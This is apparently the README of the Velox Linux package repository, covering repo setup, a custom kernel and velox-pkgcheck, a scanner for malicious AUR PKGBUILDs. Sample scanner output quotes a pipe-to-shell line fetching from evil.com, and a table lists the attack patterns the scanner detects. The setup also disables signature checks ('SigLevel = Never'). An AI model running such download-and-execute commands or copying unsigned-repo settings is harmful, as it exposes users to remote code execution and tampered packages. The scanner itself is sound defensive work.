# Velox Repository

> Official package repository for **Velox Linux** — custom packages, wallpapers, kernel, and tools built for the Velox ecosystem.

---

## Repositories

Velox Linux uses two package repositories. Add both to `/etc/pacman.conf`:

```ini
[velox_repo]
SigLevel = Never
Server = https://thelinutubetltos.github.io/velox_repo/$arch

[velox-packages]
SigLevel = Never
Server = https://github.com/thelinutubetltos/velox_repo/releases/download/velox-packages
```

Then sync and install the security scanner:

```bash
sudo pacman -Sy
sudo pacman -S velox-pkgcheck
```

From that point on, `paru` and `yay` automatically scan PKGBUILDs before installing anything — no extra steps needed.

### What each repo contains

| Repo | Hosts | Packages |
|---|---|---|
| `velox_repo` | GitHub Pages | `velox-pkgcheck`, `velox-welcome`, `velox-wallpapers` |
| `velox-packages` | GitHub Releases | `linux-velox`, `linux-velox-headers`, `calamares` |

---

## Packages

### velox_repo (GitHub Pages)

| Package | Description | Status |
|---|---|---|
| `velox-wallpapers` | Official Velox Linux wallpaper pack (Velox-1 through Velox-7) | Available |
| `velox-welcome` | Velox welcome app — first-boot setup, app installer, kernel manager | Available |
| `velox-pkgcheck` | PKGBUILD supply-chain attack scanner + `aur-install` wrapper | Available |

### velox-packages (GitHub Releases)

| Package | Description | Status |
|---|---|---|
| `linux-velox` | Custom performance-tuned Velox kernel (CachyOS base) | Available |
| `linux-velox-headers` | Headers for linux-velox | Available |
| `calamares` | Distribution installer framework | Available |

---

## Wallpapers

Wallpapers are installed to `/usr/share/wallpapers/` and automatically appear in KDE Plasma's wallpaper picker.

```bash
sudo pacman -S velox-wallpapers
```

---

## velox-welcome

The Velox welcome app launches on first boot and includes:
- System update shortcut
- One-click app installation (Gaming, Creative, Internet, Browsers)
- Kernel manager
- Snapper + grub-btrfs snapshot setup
- Package search (pacman, Chaotic-AUR, AUR, Flatpak)
- Autostart toggle

```bash
sudo pacman -S velox-welcome
```

---

## velox-pkgcheck

A supply-chain attack scanner that inspects AUR PKGBUILDs **before** installation, protecting against attacks like the [Atomic Arch campaign (June 2026)](https://www.privacyguides.org/news/2026/06/12/around-1-500-aur-packages-compromised-with-rootkit-like-malware/) — where 1,500+ AUR packages were poisoned with an eBPF rootkit and credential stealer.

Comes pre-installed on Velox Linux. On any other Arch system:

```bash
sudo pacman -S velox-pkgcheck
```

Installs two tools: `velox-pkgcheck` (the scanner) and `aur-install` (a paru/yay wrapper). It also drops symlinks at `/usr/local/bin/paru` and `/usr/local/bin/yay` — so **your existing `paru` and `yay` commands are automatically protected** without changing anything about how you use them.

### How it works

Every time you run `paru -S anything` or `yay -S anything`, the scan runs first. Here's exactly what you see for a clean package:

```
$ paru -S zen-browser

aur-install 1.0.0 (using paru)

────────────────────────────────────────────────
Scanning PKGBUILD: zen-browser
────────────────────────────────────────────────

velox-pkgcheck 1.0.0 — PKGBUILD Supply-Chain Scanner

Scanning: /tmp/tmp.xK3r7z/zen-browser/PKGBUILD
  ✓ No suspicious patterns found

════════════════════════════════════════════════
Total findings: 0
  CLEAN    — no suspicious patterns detected
════════════════════════════════════════════════

────────────────────────────────────────────────
  SCAN PASSED — proceeding with install
────────────────────────────────────────────────

:: Resolving dependencies...
[paru proceeds with the install as normal]
```

And if a package is infected (e.g. an Atomic Arch poisoned package):

```
$ paru -S totally-legit-bin

aur-install 1.0.0 (using paru)

────────────────────────────────────────────────
Scanning PKGBUILD: totally-legit-bin
────────────────────────────────────────────────

velox-pkgcheck 1.0.0 — PKGBUILD Supply-Chain Scanner

Scanning: /tmp/tmp.xK3r7z/totally-legit-bin/PKGBUILD
[CRITICAL] PKGBUILD:12 — Known malicious package: atomic-lockfile
             ↳     npm install atomic-lockfile minimist chalk
[HIGH    ] PKGBUILD:13 — Remote code execution: download piped to shell interpreter
             ↳     curl https://evil.com/payload.sh | bash

════════════════════════════════════════════════
Total findings: 2
  CRITICAL — known malicious content; do NOT install
════════════════════════════════════════════════

────────────────────────────────────────────────
  CRITICAL — installation BLOCKED
────────────────────────────────────────────────
Known malicious content was detected in one or more PKGBUILDs.
Run with --no-check to bypass this block (strongly not recommended).
```

The install never happens. paru is never called.

**What each result does:**

| Severity | Action |
|---|---|
| Clean / Info | Proceeds automatically |
| Medium | Prints warning, proceeds |
| High | Prompts `Install anyway? [y/N]` |
| Critical | **Hard blocked** — paru/yay never called |

### velox-pkgcheck standalone

Use the scanner directly on any PKGBUILD, or to check your system after the fact:

```bash
# Scan a specific PKGBUILD
velox-pkgcheck ~/path/to/PKGBUILD

# Scan all PKGBUILDs in your paru/yay cache at once
velox-pkgcheck --scan-aur-cache

# Check installed AUR packages against the Atomic Arch attack window (Jun 9-12 2026)
velox-pkgcheck --scan-installed

# Check if your system is already compromised
# (scans for eBPF rootkit artifacts, malicious npm/bun cache, suspicious systemd services)
velox-pkgcheck --check-system
```

**Severity levels:**

| Level | Triggers |
|---|---|
| `CRITICAL` | Known malicious npm/bun packages (`atomic-lockfile`, `js-digest`, etc.) or known attacker AUR accounts |
| `HIGH` | `npm install` in PKGBUILD, `curl \| bash`, `eval "$(…)"`, base64-decoded payloads, temp-dir droppers |
| `MEDIUM` | `pip/gem install`, non-HTTPS source URLs, undeclared network downloads, eBPF ops |
| `INFO` | npm build steps — likely fine, flagged for awareness |

Exit codes map to severity (0 = clean, 4 = critical), so the tool integrates cleanly into scripts and CI.

---

## linux-velox Kernel

A custom performance-tuned kernel based on the CachyOS kernel patchset, built specifically for Velox Linux. Includes scheduler optimizations and performance tweaks beyond the stock Arch kernel.

```bash
sudo pacman -S linux-velox linux-velox-headers
```

---

## For Maintainers

### Adding packages to velox_repo (GitHub Pages)

```bash
repo-add velox_repo.db.tar.gz package.pkg.tar.zst
# commit and push — GitHub Pages serves automatically
```

### Adding packages to velox-packages (GitHub Releases)

```bash
repo-add velox-packages.db.tar.gz package.pkg.tar.zst
gh release upload velox-packages --repo thelinutubetltos/velox_repo \
  package.pkg.tar.zst velox-packages.db.tar.gz velox-packages.db \
  velox-packages.files.tar.gz velox-packages.files --clobber
```

---

## Links

- [Velox Linux ISO](https://github.com/thelinutubetltos/velox-iso)
- [Download on SourceForge](https://sourceforge.net/projects/velox-linux/)
- [The Linux Tube on YouTube](https://youtube.com/@thelinuxtube)

---

<div align="center">
  <sub>Built by The Linux Tube &nbsp;|&nbsp; Shape It. Race It. Own It.</sub>
</div>
